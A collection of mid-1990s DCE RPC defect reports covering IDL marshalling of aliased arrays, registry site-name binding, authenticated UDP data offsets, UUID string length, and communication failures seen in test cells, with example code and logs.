Problems in:
        Marshalling interpreter.
 
Synopsis:
        Aliased full pointers to variable length arrays use the first length
        encountered.
 
Description:
        If a full pointer to an array is passed to an RPC multiple
        times, using different values for the "size_is()" parameter
        each time, the IDL marshaller may not transmit enough of the
        array.
 
        In the following example, a pointer to the same array of
        strings is passed as both arguments to the send_strings RPC.
        The first time the array is specified to contain 1 element,
        the second time 2.  The runtime marshalls a node for the array
        the first time it's encountered, and marshalls an array of
        length 1.  The second time it ignores the size_is parameter.
        The manager routine, trusting the second size_is, indirects
        through the nonexistant second element of the array and
        coredumps or gets a wrong result.
 
        This example is contrived, of course, and its easy to say that
        "you shouldn't do that".  The customer code where we
        first saw this problem is much more reasonable.
 
        Its arguable whether the runtime should be smart enough to
        lengthen the array when it sees it the second time.   Perhaps
        it would be enough just to raise an exception when an existing
        node is referenced with a different length than the previous
        reference.  But given that the Application Development Guide
        explicitly says you can do aliasing, the current silent error
        or coredump doesn't seem like the right answer.
 
 
Example program:
---------- bill_rqs.idl -----------
/*
 * test idl
 *
 * Copyright (C) 1995 Transarc Corporation - All rights reserved.
 *
 * HISTORY
 *  20-Apr-95  Daniel Nydick (nydick@transarc.com)
 *      Created.
 */
[
    uuid(92fe07cc-7b54-11ce-b127-9e620c39aa77),
    version(1.0)
]
interface bill_rqs
{
    typedef [ptr,string] char *string_t;
 
        /*
         * pass two arrays of strings
         */
    error_status_t send_strings(
                [in] handle_t h,
                [in,ptr,size_is(a1size)] string_t a1[],
                [in] long int a1size,
                [in,ptr,size_is(a2size)] string_t a2[],
                [in] long int a2size
        );
 
}
 
---------- client.c ----------------
/*
 * test client
 *
 * Copyright (C) 1995 Transarc Corporation - All rights reserved.
 *
 * HISTORY
 *  20-Apr-95  Daniel Nydick (nydick@transarc.com)
 *      Created.
 */
 
#include <stdio.h>
#include <stdlib.h>
#include <malloc.h>
#include <dlfcn.h>
#include <dce/pthread_exc.h>
#include <dce/rpc.h>
#include <dce/rpcexc.h>
#include <dce/sec_login.h>
#include <bill_rqs.h>
 
#define CKERR(why) if (st != error_status_ok) {\
        fprintf(stderr,"%s, err=%d\n",why,st); exit(1);}
 
/*
 * canonical usage message
 */
void usage(void)
{
    fprintf(stderr,"usage: client <string_binding>\n");
    exit(1);
}
 
/*
 * get an RPC handle.
 */
handle_t get_handle(const char *name)
{
    handle_t hndl;
    error_status_t st, dummy;
    sec_login_handle_t auth_identity;
    unsigned_char_t *server_princ;
 
    rpc_binding_from_string_binding((idl_char *)name, &hndl, &st);
    CKERR("rpc_binding_from_string_binding");
 
    return (hndl);
}
 
/*
 * make a call on the passed handle
 */
doit(handle_t h)
{
    string_t *strs;
    error_status_t st;
    int i;
 
    strs = malloc(2*sizeof(string_t));
 
    strs[0] = (idl_char *)"string 0";
    strs[1] = (idl_char *)"string 1";
 
    TRY {
        st = send_strings(h, strs, 1, strs, 2);
        if (st) fprintf(stderr,"send_strings returns failure: %d\n",st);
    } CATCH_ALL {
        fprintf(stderr,"Exception caught from send_strings 0x%x\n",THIS_CATCH);
        exit(1);
    } ENDTRY;
 
    free(strs);
}
 
main(int argc, char **argv)
{
    char *name = 0;
    handle_t h;
 
    argc--; argv++;
 
    while (argc > 0) {
        if (argv[0][0] == '-') {
            usage();
        } else {
            if (name) usage();
            name = argv[0];
        }
        argc--; argv++;
    }
    if (name == 0) usage();
 
    printf("Binding to %s\n",name);
    h = get_handle(name);
 
    doit(h);
    printf("call succeed\n");
 
    exit(0);
}
 
 
------------ server.c ----------------
/*
 * test server
 *
 * Copyright (C) 1995 Transarc Corporation - All rights reserved.
 *
 * HISTORY
 *  20-Apr-95  Daniel Nydick (nydick@transarc.com)
 *      Created.
 */
 
#define MAXCALLS 5
#define CKERR(why) if (st != error_status_ok) {\
        fprintf(stderr,"%s, err=%d\n",why,st); exit(1);}
 
#include <dce/pthread_exc.h>
#include <dce/rpc.h>
#include <bill_rqs.h>
#include <malloc.h>
#include <string.h>
#include <stdio.h>
 
extern uuid_t uuid_nil;
extern bill_rqs_v1_0_epv_t bill_rqs_v1_0_manager_epv;
 
/*
 * usage
 */
void usage(void)
{
    fprintf(stderr,"usage: server\n");
    exit(1);
}
 
/*
 * main line program
 */
main(int argc, char **argv)
{
    int i;
    error_status_t st;
    rpc_binding_vector_p_t bvec;
    unsigned_char_t *s;
 
    argc--; argv++;
    if (argc>0) usage();
 
    rpc_server_use_all_protseqs(MAXCALLS,&st);
    CKERR("rpc_server_use_all_protseqs");
 
    rpc_server_register_if(bill_rqs_v1_0_s_ifspec, &uuid_nil, NULL, &st);
    CKERR("rpc_server_register_if");
 
    rpc_server_inq_bindings(&bvec, &st);
    CKERR("rpc_server_inq_bindings");
 
    for (i=0; i<bvec->count; i++) {
        rpc_binding_to_string_binding(bvec->binding_h[i],&s,&st);
        CKERR("rpc_binding_to_string_binding");
        printf("%s\n",s);
        rpc_string_free(&s,&st);
    }
 
    TRY {
        printf("listening...\n"); fflush(stdout);
        rpc_server_listen(MAXCALLS, &st);
        CKERR("rpc_server_listen");
    } CATCH_ALL {
        fprintf(stderr,"Caught exception %x\n",THIS_CATCH);
        exit(1);
    } ENDTRY;
 
    exit(0);
}
 
/*
 * manager routines
 */
error_status_t send_strings(
    /* [in] */ handle_t h,
    /* [in] */ string_t a1[],
    /* [in] */ idl_long_int a1size,
    /* [in] */ string_t a2[],
    /* [in] */ idl_long_int a2size
){
    unsigned int i;
    printf("send_strings called. a1size=%d a2size=%d\n",a1size,a2size);
 
    printf("a1) ");
    for (i=0; i<a1size; i++) printf("\"%s\" ",a1[i]);
    printf("\n");
 
    printf("a2) ");
    for (i=0; i<a2size; i++) printf("\"%s\" ",a2[i]);
    printf("\n");
 
    return 0;
}



CR Number                     : 12842
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : NSI
Short Description             : sec_rgy_site_open_update() doesn't fail on invalid site name
Reported Date                 : 4/17/95
Found in Baseline             : 1.1
Found Date                    : 4/17/95
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public
Transarc Deltas               : 
Transarc Herder               : 
Transarc Status               : 

[4/17/95 public]

Invalid site names of different forms are treated differently
by the sec_rgy_site_open_update() call.

If site name == "/.:foobar", then result is rpc_s_incomplete_name
If site name == ".:foobar",  then result is sec_rgy_server_unavailable
If site name == ".:/foobar,  then result is error_status_ok and context
                               is to local cell

We have an internal defect open, arguing that the third case should
fail as well.

The difference in the return codes is due to the way the input string
is treated in the internal binding code.

.:foobar -- returns sec_rgy_server_unavailable
sec_rgy_site_open_update
  sec_rgy_site_bind_update
    sec_rgy_site_bind
      rca_site_bind  /* sets context->requested_site_name = .:foobar */
        rca_nsi_binding_import /* sets cellname = requested_site_name */
          rca_site_bind_nsi  /* returns false */
            rpc_ns_entry_inq_resolution /* fails with incomplete name */
          rca_site_bind_nsi_cell /* returns false */
            rca_site_bind_nsi_cell_if /* fails with incomplete name */
          rca_site_bind_pe_site /* looks in pe_site file for entry matching
                                   .:foobar - won't find it; assumes
                                   .:foobar is a string binding */
            rca_bind_to_host /* fails right off */ 

/.:foobar -- returns rpc_s_incomplete name
sec_rgy_site_open_update
  sec_rgy_site_bind_update
    sec_rgy_site_bind
      rca_site_bind  /* sets context->requested_site_name = /.:foobar */
        rpc_ns_entry_expand_name /* this gets called because the first
                                    token is a '/'; returns 
                                    rpc_s_incomplete */

.:/foobar -- succeeds
sec_rgy_site_open_update
  sec_rgy_site_bind_update
    sec_rgy_site_bind
      rca_site_bind  /* sets context->requested_site_name = .:/foobar */
        rca_nsi_binding_import
          rca_site_bind_nsi
            rpc_ns_entry_inq_resolution /* returns rpc_s_partial_results;
                                           sets site_name
                                           in context to /.../cellname */
        .
        .       the rest of the binding routines operate on
        .       context->site_name, which is legit
        .

The only way to get the behavior to be the same in the first and third
cases is to have the security runtime to treat an rpc_s_partial_results
return from rpc_ns_entry_inq_resolution as a hard failure (in
rca_site_bind_nsi() ).  However, there  is an explicit check for the
partial_results return -- it is purposefully ignored with the
following comment:

    if (STATUS_EQUAL(status, rpc_s_partial_results))
        /* keep going in order to accept principal names; revisit someday */;

Has this logic been revisited as the comment suggests?  Is there
currently any reason NOT to fail if the input site name is of the
form .:/foobar?  Consistency has its rewards...

[4/17/95 public]
It's correct for the binding code to be doing what it's doing.
Whether it's correct for NSI to return the local cell for '.:/' is another
question, so I've reassigned this defect to RPC/NSI.

We specifically allow binding to any name within a cell, as long as that
name isn't a dead end in the CDS namespace itself.  This allows you to bind
to the rgy for any user in a cell, by their global name (ie, /.../cell/user)
by determining which partial result was found in the namespace.  That partial
result must lead to a security binding (eg, be a cellname or /.:/sec or
/.:/subsys/dce/sec/<rgyname>).  If it's a name in the namespace that doesn't
lead to a registry binding (eg, /.:/subsys/garbage resolves to /.:/subsys
which doesn't itself have a binding to a security server, and isn't a cellname
so we can't just assume that the caller wants to bind to any rgy in that cell)
then the bind will fail.

So, your real complaint shouuld be that
rpc_ns_entry_inq_resolution(".:/foobar",...) returns ok with a local cell for
the .: piece.  I think I agree with you that this is wrong.  Hopefully
nothing depends on this behavior, so that they can change it...

[2/15/96 public]
This defect hasn't had any activity in almost a year... Meanwhile
our local bug has successfully made the rounds to RPC, CDS, and
back to Security. Here are excerpts from our discussion. Any insight
is greatly appreciated.

------------------------
    <Note by ywei (Yi-Hsiu Wei), 95/04/20 12:50:33, action: note>
The reason that rpc_ns_entry_inq_resolution returns ok is 
because it gets ok from the cdsExpandStrFull from the cds 
library (search for dnsExpandStrFull in rpc/runtime/nsentry.c).

If this .:/ is an incorrect syntax, cdsExpandStrFull needs
to detect that.

    <Note by yarsa (Julianne Yarsa), 95/04/20 13:49:02, action: assign>
Bad sec_rgy_site_open_update behavior boils down to bad CDS runtime behavior.
Old Component: security.src
New Component: cds.src

    <Note by garry (Garry L. Child), 95/04/21 16:40:30, action: note>
The leading slash in a name is optional.

For example, all the following are equivalent and valid:

 cdscp show obj /.../mycell/obj1
 cdscp show obj /.:/obj1
 cdscp show obj .../mycell/obj1
 cdscp show obj .:/obj1

This behavior is consistent when you remember that a "name"
is a series of simple names separated by slashes.
When a name is parsed, the slashes serve only to separate
the simple names.

I am inclined not to change this behavior since it may
cause problems with anybody who expects this behavior
and in the future when we support XFN which allows composite
names (names which may consist of multiple forms of naming
rules and syntax strung together).

    <Note by rolette (Rolette, J.M. (Jay)), 95/04/21 18:01:38, action: note>
It's not the leading slash that is the problem (but thanks for the info...
I didn't know it wasn't required).  The problem is that I passed ".:/today"
as the site_name parameter on a sec_rgy_site_open_update() call.  There are
two kinds of valid in put for the site_name parameter (according to the docs):

1) a cell name (to randomly choose a site to bind to in the specified cell)
2) a specific registry site

If ".:/today" fits either of these types, it is number 2 (it certainly isn't
a valid cell name).  However, we didn't have a registry site called "today"
in our local cell so that should have failed as well.

I don't think that this is an NSI/RPC problem.  Julie's analysis seems to nail
the problem pretty well.  rpc_ns_entry_inq_resolution is returning 
rpc_s_partial_results (which makes sense because "today" doesn't exist).  The
problem is that the partial results return code is ignored.

Burati stated "that partial result must lead to a security binding" seems to
support my argument that you can't just ignore the partial results return code.
".:/today" would return partial results of "today" which doesn't exist so the
call should fail. As it currently works today, we end up bound to the local
cell (definitely NOT what we want to happen if the user enters a bad site name).

    <Note by garry (Garry L. Child), 95/04/25 16:17:08, action: assign>
I agree with Jay's statement, since .:/foobar is legal
syntax, the partial results return code should not be ignored.

Since foobar does not lead to a security binding (because the object
does not exist), the call should fail from security.
Old Component: cds.src
New Component: security.src

    <Note by yarsa (Julianne Yarsa), 95/04/26 15:47:44, action: note>
I wrote and ran a very small test program to find out what
rpc_ns_entry_inq_resolution() returns when given input in
the form ".:/foo".  Here are the results:

[os2dce18:/sb/defects/obj/power/security/server/bin] ./testme
calling rpc_ns_entry_inq_resolution with entry name .:/foo
rpc_ns_entry_inq_resolution returns 382312643
resolved name = /.../fink
unresolved name = foo
[os2dce18:/sb/defects/obj/power/security/server/bin] dce_err 382312643
dce_err: 382312643: partial results (dce / rpc)

The security code captures the resolved name in a variable that 
is treated as the requested site name; it is passed to 
rpc_ns_binding_import_begin() along with an interface spec to
get partial binding handles.  If rpc_ns_entry_inq_resolution()
returned junk in the resolved name portion, security would
just pass this off to the rpc_ns_binding* calls which would
fail, causing the security call to fail in turn.

So... given that the initial slash is optional, and that ".:/foo"
resolves to "/.../cellname" (resolved) and "foo" (unresolved),
and that the partially resolved name is passed to the 
rpc_ns_binding_* calls, it seems that everything is working
correctly :-).  I'd suggest waiting to see what the OSF says,
and if things remain stat, documenting the site_name parameter
of the sec_rgy_site_bind* calls more fully (which might not be
a bad idea anyway) to explain how seemingly invalid input can
lead to bindings to the local cell.

Jay, just out of curiosity, what happens when you pass in a name 
like ".:/subsys/foo"?  In such a case, Burati indicates that the 
resolved portion 1) is not a cellname and 2) doesn't lead to a 
security server, and so the call will fail.  
-----------------------
Added field Transarc Deltas with value `' 
Added field Transarc Herder with value `' 
Added field Transarc Status with value `'



CR Number                     : 12800
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : idl runtime or specifically 
marshalling
Short Description             : marshalled data is offset during
a RPC authenticated call.
on
Reported Date                 : 2/22/95
Found in Baseline             : 1.1
Found Date                    : 2/22/95
Severity                      : B
Priority                      : 0
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[2/22/95 public]

An offset problem occurs when executing an authenticated call from a client to 
a server using "udp".The idl file in this case defines an input character array 
from the client and an output character array from the server.  The offset
does not occur to the data received by the server, but the data sent by the
server to the client.  The effects of this problem varies, depending upon the
arguments stated in the idl file.  One effect is rpc runtime returning a
"Stub or runtime protocol error (dce/rpc)" status to the client.  Another 
effect is missing characters in the client's string received from the server.

After investigating the problem, the root cause of the error is due to the
adjustment of the data_length perfomed in the rpc__dg_xmitq_append_pp routine.
This adjustment is needed for data encryption which depend on data_lengths to 
be in 8 byte blocks. The adjustment is made only if the call is authenicated 
and the data_length is not a multiple of 8.  In the case stated previously the 
length of the arrays are not a multiple of 8 and therefore will require
adjustment if the client performs an authenticated call.  Once the server 
receives the adjusted data, the server stub will then unmarshall the input 
arguments by executing rpc_ss_ndr_unmar_interp.  Returning from this routine
results in extra bytes of data ignored by the unmarshall.  This result is
reflected in the structure variable IDL_ms->IDL_left_in_buff. The value of 
this variable is equal to the adjustment made by the client during the 
rpc__dg_xmitq_append_pp routine.  This variable IDL_ms->IDL_left_in_buff is
again used in the server stub during the  rpc_ss_ndr_marsh_interp routine. The 
actual incorrect offset takes place in the rpc_ss_ndr_marsh_by_copying routine
which checks IDL_ms->IDL_left_in_buff to determine the amount of bytes to
memcpy from the fixed array into the data buffer. Since the value of 
IDL_ms->IDL_left_in_buff is not 0 rpc_ss_ndr_marsh_by_copying will try to
use the remaining buffer and supposedly transmit the full buffer.  The 
transmission will not take place since IDL_msp->IDL_buff_addr=NULL,
therefore, the server will lose the data and introduce an offset into the
data sent to the client. 

One solution is to intialize IDL_ms->IDL_left_in_buff back to zero once
the rpc_ss_ndr_unmar_interp routine has deallocated 
IDL_msp->IDL_elt_p->buff_addr and set IDL_msp->IDL_elt_p=NULL.

A question arises whether unmarshall should handle the adjusted data
or should the executor thread re-adjust the data_length before calling the
server stub???

[2/23/95 public]

During the dce1.1 development, I saw this problem. (It gave me a coredump
because of the null pointer.) But for some reason which I can't recall, it
wasn't considered as a bug. (It is not supposed to happen? It didn't happen
to me after I cleaned up the DG MBF codes.) I'll try to dig up my memory.
(It was the last spring. Something with SPI?)

As for the above question, it is the stub's (thus, unmarshalling engine)
responsibility to discard the unwanted data at the end because it knows
exactly how many bytes it is receiving. Clearly, IDL_ms->IDL_left_in_buff
should be reset to zero when the turnaround happens. The receiver's rpc
runtime doesn't know whether or not the sender's runtime adjusted the data
length.

[3/03/95 public]

A testcase can be provided to further investigate the problem if needed.

[2/8/96 public]
Can you post the test case here? Does this still happen in 1.2.1? Should
the priority lowered from 0 to 2?



CR Number                     : 12773
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : uuid
Short Description             : what is length of UUID string?
Reported Date                 : 1/9/95
Found in Baseline             : 1.1
Found Date                    : 1/9/95
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[1/9/95 public]
Something I found lying around from Aug 93.  
Forgive me if it's out of date. 
It would be nice if RPC provided some value which is the maximum
length of a UUID string.   There are several in use in some components
but none are public.  Command line apps (e.g., dcecp) could use this.

Below are the notes I made long ago:

  In acl_edit when getting the an extension type uuid (see
  security/client/admin/acl_edit/deif.c, function
  deif_get_extended_info) they consume all characters until a
  dot (the separator from the format labels).  Interesting
  that the comment says:
  
   *  where uuid_string is a fixed length ascii representation of
   *  an NCS 2.0 uuid
  
  In rpccp where uuids are entered by the user in profiles for
  example, they read everything that doesn't include a comma
  (the separator from the version numbers in an interface id):
  
          sscanf (opts[5].values[0], "%[^,],%hd.%hd",
                  interface_uuid,
                  &(interface_id.vers_major),
                  &(interface_id.vers_minor));
  
  rpccp.c:#define MAX_IF_ID_STRING_LENGTH         36 + 9 + 9 + 1
  uuidp.h:#define uuid_c_uuid_string_max          37

[01/09/95 public]
Well, it'd be a convenience, albeit marginal I think.   You can always
found it out by typing
	expr length `uuidgen`
at the shell (and add one for the trailing \0).  Oh yeah, it's 36 w/o \0.
This assumes uuidgen outputs AES-conformant uuid strings.

The differences between rpccp and acl_edit don't matter, since they're
two different programs with different input formats (one of the problems
dcecp solves).

[melman 1/9/95 public] 
The "expr length" trick only works with the default format of UUID.
For example, if you were writing a program that needed to ask a user
for input, how large a buffer would you need?  What if they entered an
old style UUID (version 1?)  Would it fit with all the .'s between the
address bytes?  What about future versions?

Anyway, I was thinking more for new apps than for dcecp.

[01/09/95 public]
Sorry my main point got lost in the cutesy-ness.

If a program wants a user to enter a uuid, it should either accept official
newstyle string formats (36 bytes of data), or its own format.  Adding
a constant equivalent to sizeof("397abfd4-2bee-11ce-a085-08000925634b")
(oops, there I go being clever again :-) is not very important.  Either
the programmer will know only a uuid is being handed around/entered here,
in which case they can count, or they'll have to know their own requirements.



CR Number                     : 12765
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : _DCE_PROTO_ should be defined
for C++
Reported Date                 : 12/7/94
Found in Baseline             : 1.1
Found Date                    : 12/7/94
Severity                      : D
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : dce.h
Sensitivity                   : public

[12/7/94 public]
All the various copies of dce.h appear to define _DCE_PROTO_ only if
__STDC__ is defined.  In order for full function prototypes to be in
scope when including a DCE header file into a C++ module, _DCE_PROTO_
should also be defined whenever __cplusplus is defined.



CR Number                     : 12700
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : test
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : rpc
Subcomponent Name             : 
Short Description             : I18N eval/codeset conversion fails
Reported Date                 : 10/21/94
Found in Baseline             : 1.1b22
Found Date                    : 10/21/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/21/94 public]

The following error were found in the journal file:

...
10|2 /ts/cs_eval/cs_byte/method_fixed_cmir 12:44:20|TC Start, scenario ref 108-1
15|2 1.10 1|TCM Start
400|2 1 1 12:44:21|IC Start
200|2 1 12:44:21|TP Start
520|2 1 31377 1 1|test case (cs_byte client_method_fixed_cmir_array)
520|2 1 31377 1 2|PASSED rpc_ns_binding_import_begin()
520|2 1 31377 1 3|PASSED rpc_ns_import_ctx_add_eval()
520|2 1 31377 1 4|FAILED rpc_ns_binding_import_next()   result:   No more bindin
gs (dce / rpc)  expected:   Successful completion (dce / svc)
220|2 1 1 12:44:52|FAIL
...
10|7 /ts/cs_eval/cs_byte/method_conf 12:47:04|TC Start, scenario ref 113-1
15|7 1.10 1|TCM Start
400|7 1 1 12:47:05|IC Start
200|7 1 12:47:05|TP Start
520|7 1 31398 1 1|test case (cs_byte client_method_conf_array)
520|7 1 31398 1 2|PASSED rpc_ns_binding_import_begin()
520|7 1 31398 1 3|PASSED rpc_ns_import_ctx_add_eval()
520|7 1 31398 1 4|PASSED rpc_ns_binding_import_next()
520|7 1 31398 1 5|PASSED rpc_ns_binding_import_done()
520|7 1 31398 1 6|PASSED rpc_ep_resolve_binding()
520|7 1 31398 1 7|PASSED rpc_mgmt_is_server_listening()
520|7 1 31398 1 8|FAILED 382312502  MSG: Connection closed (dce / rpc)
520|7 1 31398 1 9|FAILED 382312514  MSG: Connection request rejected (dce / rpc)

520|7 1 31398 1 10|FAILED 382312514  MSG: Connection request rejected (dce / rpc
)
520|7 1 31398 1 11|FAILED 382312514  MSG: Connection request rejected (dce / rpc
)
520|7 1 31398 1 12|FAILED 382312514  MSG: Connection request rejected (dce / rpc
)
520|7 1 31398 1 13|FAILED rpc_mgmt_stop_server_listening()      result:   Connec
tion request rejected (dce / rpc)       expected:   Successful completion (dce /
 svc)
220|7 1 40 12:47:39|DCE_FAIL
510|7|ABORT on result code 40 "DCE_FAIL"
50||Result code action is Abort

[10/25/94 public]
Mariko, can you please work with Bob on these failures.



CR Number                     : 12587
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : runtime
Short Description             : Need nca_s_auth_bad_integrity
Reported Date                 : 10/12/94
Found in Baseline             : 1.1
Found Date                    : 10/12/94
Severity                      : E
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[10/12/94 public]

The new reject status code, nca_s_auth_bad_integrity, needs to be defined
(in AES and/or X/Open spec.) so that the server can report the more useful
reject reason.



CR Number                     : 12315
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : rpc
Subcomponent Name             : 
Short Description             : rpc failures seen with dts and dfs
Reported Date                 : 9/23/94
Found in Baseline             : 1.1b18
Found Date                    : 9/23/94
Severity                      : A
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[9/23/94 public]

Sorry Tom ... this is the one of the few clues we have for the
terrible performance we in system test and DFS land are seeing
with DCE.

Breaking this out from CR 11913 :

Errors like:

1994-09-20-13:44:08.249-04:00I----- dtsd ERROR dts dtsdate time_request.c 685 0x
401bff28 RPC call ClerkRequstTime() to remote server failed: Communications fail
ure (dce / rpc)
1994-09-20-13:47:16.665-04:00I----- dtsd ERROR dts dtserror dtss_service_global_
set.c 478 0x7aff8550 Couldn't get remote server's principal name: Communications
failure (dce / rpc)
1994-09-20-17:54:38.502-04:00I----- dtsd ERROR dts dtsdate time_request.c 685 0x
401bf0a8 RPC call ClerkRequstTime() to remote server failed: Communications fail
ure (dce / rpc)
1994-09-21-11:25:36.172-04:00I----- dtsd ERROR dts dtsdate time_request.c 685 0x
401bf0a8 RPC call ClerkRequstTime() to remote server failed: Communications fail
ure (dce / rpc)
1994-09-21-11:25:43.036-04:00I----- dtsd ERROR dts dtserror dtss_service_global_
set.c 478 0x7aff8550 Couldn't get remote server's principal name: Communications
failure (dce / rpc)
1994-09-21-13:25:09.584-04:00I----- dtsd ERROR dts dtsdate time_request.c 685 0x
401bff28 RPC call ClerkRequstTime() to remote server failed: Who are you failed
(dce / rpc)

are seen in an otherwise healthy and IDLE cell. I know that this may have always
been occuring and that serviceability just makes it more visible BUT all this doesn't 
explain why we're getting comm failures. Note that since BOTH dts and dfs are 
seeing comm failures, both tcp and udp are a problem (at least I think that's
how it works).

I added Jean Hsiao to the list to see if he has any performance tools or tests
you can use to pursue this. Mike Burati feels auditing is suspect so system
test will be running idle cells with 3 dts servers with and without auditing.
Peter O. (cell with auditing) and I (cell without auditing) will update this
CR with what we find from this weekend.

[9/26/94 public]
BUILD: 18.2

CONFIG:	dce11 (HP)	sec, dts and flserver (dfs)
	dce8 (HP)	cds, dts and flserver (dfs)
	wolfboy (RIOS)	dts and flserver (dfs)

ALL MACHINES CONFIG'd WITH AUDITING OFF

no errors seen on dce11
1 error seen on dce8:
994-09-24-20:55:48.095-04:00I----- dtsd ERROR dts dtserror dtss_service_global_
set.c 478 0x7aff8388 Couldn't get remote server's principal name: Communications
 failure (dce / rpc)

1 error seen on wolfboy:
1994-09-24-22:57:28.282-04:00I----- dtsd ERROR dts dtserror dtss_service_global_
set.c 478 0x200b76a8 Couldn't get remote server's principal name: Communications
 failure (dce / rpc)

Nothing significant was going on at either time that I know of - the cell was not
under any stress - the basic connectathon tests were running from dce8 to a 
fileset on wolfboy but each iteration only took 3-4 minutes so we'd have seen a LOT
more of those messages if the test was causing them. All iterations of the test passed
and the iterations at the times of these messages were just as fast as all the others.

[9/26/94 public]
For the record, (and to be fair) other cells did NOT show the problem:

BUILD: 18.2

For CR 12315, left 2 cells idle:

Cell 1:	DFS and AUDITING on - NO DTS COMM FAILURES
shades (i):	sec cds dts
cobbler (r):	dts flserver (dfs)
largo (h):	dts flserver (dfs)
spanky (h):	dts flserver (dfs)

Cell 2: DFS and AUDITING off - NO DTS COMM FAILURES
darkman (h):	sec dts
darla (h):	cds dts
rum (h):	dts

but the dcecp cell (which was also idle and had AUDITING on)
did show some comm failures... hard to find a pattern so far.

[9/28/94 public]
More data points using bl-19:
 - Ran a 3 server, 1 clerk cell overnight and saw no comm failures.
 - Rick ran the dced systems test using only DG for 3 hours and saw
   no comm failures.

Could it be random network load from OSF backups?

[9/29/94 public]
Note: This is still happening even after the fix for 12179 (slowness).
PeterO saw these problems again in bl20 today.  Also note that in the
kernel version of who_are_you, you will see who_are_you failed messages
if there was a "decrypt integrity error" like you're seeing above, but
I don't understand why DTS would be causing calls through kernel RPC
(unless it's accessing something in DFS?).

[9/29/94 public]
Arrghhh...  My brain is frazzled...  I was reading too many CRs...  The
problem Peter and Martha have seen in the last two days is the comm failure
and/or who_are_you failures above, not decrypt integrity & who_are_you
failures.  Ignore the last part of my previous comment...

[9/29/94 public]
A major progress point. 

 Running the perf test on bl-20 the following test fails with comm failure:

> root@tsunami % client 3 "ncadg_ip_udp"
> Broadcast test [3]
>   Broadcast call that should succeed...
> *** "Communications failure" exception raised

This was running from an HP client  to a 486 server, 
but the other way around has the same failure.

The CN test don't do broadcasts, and if this is the reason why
we have been seeing these failures, we need to check out
the broadcast code in DG.

[9/29/94 public]
I must be getting delirious.  The tests were run on machines
that are on seperate subnets, and our routers don't forward
broadcast packets.  Ran it again on the same host, and it works fine.
Nevermind...

[9/30/94 public]

Not to confuse the issue even further, if that's possible, but in my
BL-20 cell configured last night, I did see the decrypt integrity errors
and "who are you" failures from DTS.  There were no tests running in the cell, 
I started getting decrpypt failure messages as soon as I brought up a
dce client after configuring a split server.

[9/30/94 public]
While they may be similar in cause, the "decrypt integrity" errors are
already being tracked in CR11009.  Haven't heard of this happening in DFS
lately.  Why is it that only DTS is having these problems, when all components
are using RPC without seeing this?

HP-UX: secd dtsd   (who are you failures)
OSF/1: cdsd dtsd   (decrypt errors)
OSF/1: client dtsd ntp_provider (decrypt errors, this node got them first) 
 
The messsages were scrolling off my screen when I left last night, but
stopped about fifteen minutes after I left.  Figures.  I'm going to
re-configure the cell from scratch this morning, with BL-20 and see what 
happens.

[9/30/94 public]
Note that Mike is correct that Peters comments belong in 11009.

Dtsd shows stuff like this for several reasons:
	- It checks it status returns carefully and prints out
	  svc error messages when things don't look right.

	- It is the first-line consumer of security and cds services,
	  and does so every 2 minutes (for dts servers).  So if anything
	  is flakey in the cell, dtsd will see it and tell you about it.


Note also that the dced test case gets communication failures when run
and we are using RPC_SUPPORTED_PROTSEQS to narrow down which protocol.
The tests were run last night with CN for 21 hours, and no comm_failures
were seen.

[9/30/94 public]
Note also that a dfs system test has been running in bl-20 cell successfully
for 17 hours now and no DTS comm failures have been seen there either ...

I believe I HAVE heard people say they've seen comm failures since bl-20
but without updates to this CR, there's nothing recent to go on. Also,
people have to be careful that the comm failures are inexplicable and
unexpected (ie. nothing coredumped, no dce_shutdowns going on, etc.)
I'll let you know the minute I see one (you were worried I'm sure :-)

[10/3/94 public]
Only ??? were seen in my 4 machine, all HP, fts test 12 + 14 cell:

1994-10-02-16:01:29.066-04:00I0.614 dtsd ERROR dts dtserror dtss_service_global_
set.c 478 0x7affa060 Couldn't get remote server's principal name: Communications
 failure (dce / rpc)

In my dfs.read_write_all.main cell with 2 HPs and 1 RIOS:

1994-10-01-06:32:48.330-04:00I----- dtsd ERROR dts dtserror dtss_service_global_
set.c 478 0x7affa020 Couldn't get remote server's principal name: Communications
 failure (dce / rpc)
